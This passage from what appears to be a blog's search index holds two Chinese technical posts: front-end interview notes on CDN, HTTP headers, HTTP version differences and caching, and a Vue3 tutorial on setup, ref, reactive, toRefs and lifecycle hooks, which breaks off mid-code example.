            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理关前端面试题整理</title>
      <link href="/2021/05/b35dbbf04ee7.html"/>
      <url>/2021/05/b35dbbf04ee7.html</url>
      
        <content type="html"><![CDATA[<h1 id="CDN-是什么？"><a href="#CDN-是什么？" class="headerlink" title="CDN 是什么？"></a>CDN 是什么？</h1><blockquote><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p></blockquote><p>内容分发网络（Content Delivery Network，简称CDN）是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。CDN应用广泛，支持多种行业、多种场景内容加速，例如：图片小文件、大文件下载、视音频点播、直播流媒体、全站加速、安全加速。</p><h1 id="HTTP-报文的构成，以及常见的-HTTP-头部有哪些？"><a href="#HTTP-报文的构成，以及常见的-HTTP-头部有哪些？" class="headerlink" title="HTTP 报文的构成，以及常见的 HTTP 头部有哪些？"></a>HTTP 报文的构成，以及常见的 HTTP 头部有哪些？</h1><blockquote><p><a href="https://segmentfault.com/a/1190000010345301">https://segmentfault.com/a/1190000010345301</a></p></blockquote><p>HTTP请求报文包含：</p><p><img src="https://i.loli.net/2021/07/20/L3TGp4XUeY91ItE.png" alt=""></p><p>HTTP响应报文包含：</p><p><img src="https://i.loli.net/2021/07/20/fWosAyFYUSdtbTM.png" alt=""></p><p>对于请求头/响应头来说，他们又分为通用首部、请求/响应首部、实体首部：</p><p>通用首部字段：</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Cache-Control</td><td>控制缓存的行为</td></tr><tr><td>Connextion</td><td>逐跳首部、连接的管理</td></tr><tr><td>Date</td><td>创建报文的日期时间</td></tr><tr><td>Pragma</td><td>报文指令</td></tr><tr><td>Transfer-Encoding</td><td>指定报文主体的传输编码方式</td></tr></tbody></table><p>请求首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>用户代理可处理的媒体类型</td></tr><tr><td>Accept-Charset</td><td>优先的字符集</td></tr><tr><td>Accept-Encoding</td><td>优先的内容编码</td></tr><tr><td>Accept-Language</td><td>优先的语言</td></tr><tr><td>Host</td><td>指定资源所在服务器</td></tr><tr><td>If-Match</td><td>比较实体标记（ETag）</td></tr><tr><td>If-Modified-Since</td><td>比较资源的更新时间</td></tr><tr><td>If-None-Match</td><td>比较实体标记（与If-Match相反）</td></tr><tr><td>Referer</td><td>对请求中URI的原始获取方</td></tr><tr><td>User-Agent</td><td>Http客户端程序的信息</td></tr></tbody></table><p>响应首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept-Range</td><td>是否接受字节范围请求</td></tr><tr><td>ETag</td><td>资源的匹配信息</td></tr><tr><td>Location</td><td>另客户端重定向至指定URI</td></tr><tr><td>Server</td><td>Http服务器的安装信息</td></tr><tr><td>Vary</td><td>代理服务器缓存的管理信息</td></tr></tbody></table><p>实体首部字段</p><blockquote><p>实体首部字段，就是用来表示实体内容和要求的字段</p></blockquote><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Allow</td><td>资源可支持的Http方法</td></tr><tr><td>Content-Encoding</td><td>实体主体适用的编码方式</td></tr><tr><td>Content-Language</td><td>实体主体的自然语言</td></tr><tr><td>Content-Length</td><td>实体主体的大小（字节）</td></tr><tr><td>Content-Location</td><td>替代对应资源的URI</td></tr><tr><td>Content-Type</td><td>实体主体的媒体类型</td></tr><tr><td>Expires</td><td>实体主体过期的日期时间</td></tr><tr><td>Last-Modified</td><td>资源的最后修改日期时间</td></tr></tbody></table><p>从以上这些之外，还有比如Cookie、Set-Cookie和Content-Disposition等在其他RFC中定义的首部字段也经常被用到。</p><h1 id="电脑的ip是如何分配的"><a href="#电脑的ip是如何分配的" class="headerlink" title="电脑的ip是如何分配的"></a>电脑的ip是如何分配的</h1><blockquote><p><a href="https://saucer-man.com/network/43.html">https://saucer-man.com/network/43.html</a></p></blockquote><h1 id="用ping指令得到的百度ip能直接访问，但为什么用ping指令得到的知乎ip不能直接访问"><a href="#用ping指令得到的百度ip能直接访问，但为什么用ping指令得到的知乎ip不能直接访问" class="headerlink" title="用ping指令得到的百度ip能直接访问，但为什么用ping指令得到的知乎ip不能直接访问"></a>用ping指令得到的百度ip能直接访问，但为什么用ping指令得到的知乎ip不能直接访问</h1><blockquote><p><a href="https://www.zhihu.com/question/48724764">https://www.zhihu.com/question/48724764</a></p></blockquote><p>为了加快网站的访问速度，当用户访问知乎的域名后跳转到一个代理服务器上，代理服务器根据请求头的 <code>host</code> 再将请求转发到真正的知乎服务器上，再将资源返回给用户。</p><p>然而通过 ping 指令 <code>ping zhihu.com</code> 得到的 ip 地址只是一个代理服务器的地址，我们用浏览器直接访问这个地址后，由于缺少了必要的请求头，代理服务器将无法得知需要将该请求转发到何处，同时代理服务器本身是不允许用户直接访问的，因此浏览器将会根据代理服务器的设置而显示不同的错误页面（如 400 Bad Request）。</p><h1 id="http-1-1-与-1-0-的区别-2-0-新增了什么"><a href="#http-1-1-与-1-0-的区别-2-0-新增了什么" class="headerlink" title="http 1.1 与 1.0 的区别 2.0 新增了什么"></a>http 1.1 与 1.0 的区别 2.0 新增了什么</h1><blockquote><p><a href="https://juejin.cn/post/6844903489596833800">https://juejin.cn/post/6844903489596833800</a></p></blockquote><p><img src="https://i.loli.net/2021/07/20/9Koe7U5wMfrhniE.png" alt=""></p><p>1.0 和 1.1 的区别：</p><ol><li><p><strong>缓存处理</strong>，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p></li><li><p><strong>带宽优化及网络连接的使用</strong>，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p></li><li><p><strong>错误通知的管理</strong>，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p></li><li><p><strong>Host头处理</strong>，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。</p></li><li><p><strong>长连接</strong>，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</p></li></ol><p>1.1 和 2.0 的区别：</p><ol start="6"><li><p><strong>新的二进制格式</strong>（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。</p></li><li><p><strong>多路复用</strong>（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。</p></li><li><p><strong>header压缩</strong>，如上文中所言，对前面提到过HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。</p></li><li><p><strong>服务端推送</strong>（server push），同SPDY一样，HTTP2.0也具有server push功能。</p></li></ol><h1 id="协商缓存、强缓存"><a href="#协商缓存、强缓存" class="headerlink" title="协商缓存、强缓存"></a>协商缓存、强缓存</h1><blockquote><p><a href="https://blog.esunr.site/2019/11/a337085f30b7.html">https://blog.esunr.site/2019/11/a337085f30b7.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3新特性初探与对比</title>
      <link href="/2021/05/2d8c057077e7.html"/>
      <url>/2021/05/2d8c057077e7.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Vue3-新特性"><a href="#1-Vue3-新特性" class="headerlink" title="1. Vue3 新特性"></a>1. Vue3 新特性</h1><p>Vue3 的一些特性：</p><ul><li>渐进式开发，兼容 Vue2 的特性</li><li>性能的提升<ul><li>打包减少 41%</li><li>初次渲染快 55%</li><li>更新快 133%</li><li>内存占用 54%</li></ul></li><li>Composition API 合集，解决组件开发问题</li><li>新的 API 的加入<ul><li>Teleport 瞬移组件</li><li>Suspense 解决异步组件加载问题</li></ul></li><li>更好的 Typescript 支持</li></ul><h1 id="2-脚手架工具"><a href="#2-脚手架工具" class="headerlink" title="2 脚手架工具"></a>2 脚手架工具</h1><p>使用 vue-cli 创建项目后，vscode 的 prettier 可能与 eslint 存在冲突，需要手动设置。具体表现在使用 ctrl+shift+f 进行格式化时，会采用全局 prettier 规则，而在 ctrl+s 时会采用项目的 eslint 规则，对文件进行格式化。</p><p>在全局的 prettier 规则中 <code>trailingComma</code> 默认设置为 <code>es5</code> 即在多行的数组、对象的每一项的末尾都添加 <code>,</code>。然而在项目内的 eslint 读取的 @vue/prettier 插件规则中，该项被设置为 <code>none</code>，因此需要手动将规则设置为与全局的规则一致，具体修改方案：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  // .eslintrc.js</span><br><span class="line">  module.exports = &#123;</span><br><span class="line">    root: true,</span><br><span class="line">    env: &#123;</span><br><span class="line">      node: true,</span><br><span class="line">    &#125;,</span><br><span class="line">    extends: [</span><br><span class="line">      &quot;plugin:vue/vue3-essential&quot;,</span><br><span class="line">      // ... ...</span><br><span class="line">    ],</span><br><span class="line">    parserOptions: &#123;</span><br><span class="line">      ecmaVersion: 2020,</span><br><span class="line">    &#125;,</span><br><span class="line">    rules: &#123;</span><br><span class="line">      &quot;no-console&quot;: process.env.NODE_ENV <span class="comment">=== &quot;production&quot; ? &quot;warn&quot; : &quot;off&quot;,</span></span><br><span class="line">      &quot;no-debugger&quot;: process.env.NODE_ENV <span class="comment">=== &quot;production&quot; ? &quot;warn&quot; : &quot;off&quot;,</span></span><br><span class="line"><span class="addition">+     &quot;prettier/prettier&quot;: [&quot;warn&quot;, &#123; trailingComma: &quot;es5&quot; &#125;],</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h1 id="3-创建一个-Vue-实例"><a href="#3-创建一个-Vue-实例" class="headerlink" title="3. 创建一个 Vue 实例"></a>3. 创建一个 Vue 实例</h1><p>在 Vue3 中，创建一个实例与 Vue2 有着很大的差别。在 Vue2 中创建实例我们通常使用 new 关键字，来直接创建一个 Vue 实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; message &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;Hello Vue!&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然而在 Vue3 中，引入了新的 api <code>Vue.createApp()</code> 来创建 Vue 实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;counter&quot;</span>&gt;</span></span><br><span class="line">  Counter: &#123;&#123; counter &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Counter</span> = &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(<span class="title class_">Counter</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#counter&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="4-setup"><a href="#4-setup" class="headerlink" title="4. setup"></a>4. setup</h1><blockquote><p><a href="https://vue3js.cn/docs/zh/api/composition-api.html#setup">https://vue3js.cn/docs/zh/api/composition-api.html#setup</a></p></blockquote><p>一个组件选项，在创建组件<strong>之前</strong>执行，一旦 <code>props</code> 被解析，并作为组合式 API 的入口点</p><h2 id="4-1-ref"><a href="#4-1-ref" class="headerlink" title="4.1 ref"></a>4.1 ref</h2><p>在创建 Vue3 组件实例时新增了一个 <code>setup</code> 属性，该属性应当传入一个方法，通过该属性，可以简化我们之前需要同时编写 <code>data</code> 与 <code>methods</code> 属性来执行某些操作。</p><p>同时也新增了 <a href="https://vue3js.cn/docs/zh/api/refs-api.html#ref">ref</a> 方法，接受一个内部值并返回一个响应式且可变的 ref 对象。创建的 ref 对象必须使用 <code>refObj.value</code> 的方式去写入值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;欢迎光临红浪漫洗浴中心&lt;/h2&gt;</span><br><span class="line">    &lt;div&gt;请选择一位美女为你服务&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button</span><br><span class="line">      v-for=&quot;(item, index) in girls&quot;</span><br><span class="line">      v-bind:key=&quot;index&quot;</span><br><span class="line">      @click=&quot;selectGirlFun(index)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">      &#123;&#123; index &#125;&#125; : &#123;&#123; item &#125;&#125;</span><br><span class="line">    &lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;你选择了【&#123;&#123; selectGirl &#125;&#125;】为你服务&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; defineComponent, ref &#125; from &quot;vue&quot;;</span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &quot;App&quot;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const girls = ref([&quot;大脚&quot;, &quot;刘英&quot;, &quot;晓红&quot;]);</span><br><span class="line">    const selectGirl = ref(&quot;&quot;);</span><br><span class="line">    </span><br><span class="line">    // 由于函数无需转为 “响应式” 对象，因此无需使用 ref 进行转化</span><br><span class="line">    const selectGirlFun = (index: number) =&gt; &#123;</span><br><span class="line">      selectGirl.value = girls.value[index];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      girls,</span><br><span class="line">      selectGirl,</span><br><span class="line">      selectGirlFun,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>从这里可以看出 vue3 与 ReactHook 有一定的相似之处，<code>ref</code> 创建值相当于 ReactHook 中使用 <code>useState</code> 创建 State 对象；<br>同时在 <code>setup</code> 中直接编写的函数方法可以在 template 中直接调用，也与 ReactHook 中写入编写的方法可以直接在 jsx 中调用有相似之处。</p></blockquote><h2 id="4-2-reactive"><a href="#4-2-reactive" class="headerlink" title="4.2 reactive"></a>4.2 reactive</h2><p>在上面的代码中，每次创建值都需要使用 <code>ref</code> 同时写入值时也需要使用 <code>refObj.value</code> 来改写；为了避免上面的繁琐操作，可以使用 <a href="https://vue3js.cn/docs/zh/api/basic-reactivity.html#reactive">reactive</a> 来简化操作。 </p><p><code>reactive</code> 可以返回对象的<strong>响应式</strong>副本，可以简单理解为传入的属性都会被转化为“响应式”的，相当于将传入的所有属性都使用 <code>ref()</code> 去生成一个响应式且可变的 ref 对象（待商榷）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> girls = <span class="title function_">ref</span>([<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>]);</span><br><span class="line"><span class="keyword">const</span> selectGirl = <span class="title function_">ref</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// selectGirlFun 可以直接在 template 中被绑定调用</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">selectGirlFun</span> = (<span class="params">index: number</span>) =&gt; &#123;</span><br><span class="line">  selectGirl.<span class="property">value</span> = girls.<span class="property">value</span>[index];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  girls,</span><br><span class="line">  selectGirl,</span><br><span class="line">  selectGirlFun,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="attr">girls</span>: [<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>],</span><br><span class="line">  <span class="attr">selectGirl</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">selectGirlFun</span>: <span class="function">(<span class="params">index: number</span>) =&gt;</span> &#123;</span><br><span class="line">    data.<span class="property">selectGirl</span> = data.<span class="property">girls</span>[index];</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>但是当我们在 <code>setup</code> 中返回可响应数据对象时，如果使用展开运算符，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  ...data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么得到的数据是将是一组不可变的，原因是因为 <code>reactive</code> 返回的是一个响应式对象，而展运算符会破坏这种结构。</p><p>这时可以使用 <a href="https://vue3js.cn/docs/zh/api/refs-api.html#torefs">toRefs</a>。<code>toRefs</code> 可以用来为源响应式对象上的 property 性创建一个 ref，然后可以将 ref 传递出去，从而保持对其源 property 的响应式连接。</p><p>借助这个特性，我们就可以获取一个 ToRefs 对象，这个对象的所有 property 都连接到了原始对象，因此：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="comment">// ... some property</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> refData = <span class="title function_">toRefs</span>(data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  ...refData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="comment">// ... some property</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h1 id="5-生命周期"><a href="#5-生命周期" class="headerlink" title="5 生命周期"></a>5 生命周期</h1><h2 id="5-1-在-setup-中使用生命周期"><a href="#5-1-在-setup-中使用生命周期" class="headerlink" title="5.1 在 setup 中使用生命周期"></a>5.1 在 setup 中使用生命周期</h2><p>vue2 中有以下生命周期：</p><p><img src="https://cn.vuejs.org/images/lifecycle.png" alt=""></p><p>在 vue3 中，如果使用了 <code>setup()</code>，那么 <code>setup()</code> 会在 <code>beforeCreate</code> 与 <code>created</code> 之前执行。</p><p>如果要在 <code>setup()</code> 中使用生命周期可以从 vue 中导出 <code>onXXX</code> 的方法，在 <code>setup()</code> 中调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; onBeforeMount, onMounted, reactive, toRefs &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Demo02&quot;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Life Event</span></span><br><span class="line">    <span class="title function_">onBeforeMount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onBeforeMount&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-2-Vue3-的生命周期执行顺序"><a href="#5-2-Vue3-的生命周期执行顺序" class="headerlink" title="5.2 Vue3 的生命周期执行顺序"></a>5.2 Vue3 的生命周期执行顺序</h2><p>在 Vue3 中，Vue2 老的生命周期钩子函数仍然可以使用，但是他们都稍晚于 Vue2 中在 <code>setup()</code> 中执行的生命周期钩子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Demo02&quot;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;setup()&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Life Event</span></span><br><span class="line">    <span class="title function_">onBeforeMount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onBeforeMount&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onMounted&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beforeCreate&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beforeMount&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mounted&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setup()</span><br><span class="line">beforeCreate</span><br><span class="line">created</span><br><span class="line">onBeforeMount</span><br><span class="line">beforeMount</span><br><span class="line">onMounted</span><br><span class="line">mounted</span><br></pre></td></tr></table></figure><blockquote><p>Vue3 中没有 <code>onBeforeCreate()</code> 与 <code>beforeCreated</code> 生命周期钩子</p></blockquote><h2 id="5-3-新增的生命周期函数"><a href="#5-3-新增的生命周期函数" class="headerlink" title="5.3 新增的生命周期函数"></a>5.3 新增的生命周期函数</h2><p>Vue3 新增了 <code>onRenderTracked</code> 与 <code>onRenderTriggered</code> 生命周期钩子，可以用于调试。</p><p><code>onRenderTracked()</code> 状态跟踪函数，会跟踪每个值的变动，其内部传递的回调函数存在一个 <code>event</code> 参数，可以获取到监听结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 